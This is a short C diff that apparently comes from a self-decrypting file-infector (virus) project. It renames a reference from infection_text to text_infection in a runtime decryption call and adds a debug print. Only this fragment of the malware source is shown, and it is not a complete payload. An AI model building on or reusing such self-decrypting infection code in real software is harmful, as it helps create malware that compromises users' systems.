@@ -31,7 +31,8 @@ void host_constructor(struct s_host *host, struct s_keychain *keychain, const ch
 	close(fd);
 
 	update_keychain_right(keychain, (char *)host_constructor, (void *)criteria - (void *)host_constructor);
-	decrypt_right(keychain, (char *)criteria, (void *)infection_text - (void *)criteria);
+	decrypt_right(keychain, (char *)criteria, (void *)text_infection - (void *)criteria);
 
+	printf("host\n\n");
 	criteria(host, keychain);
 }
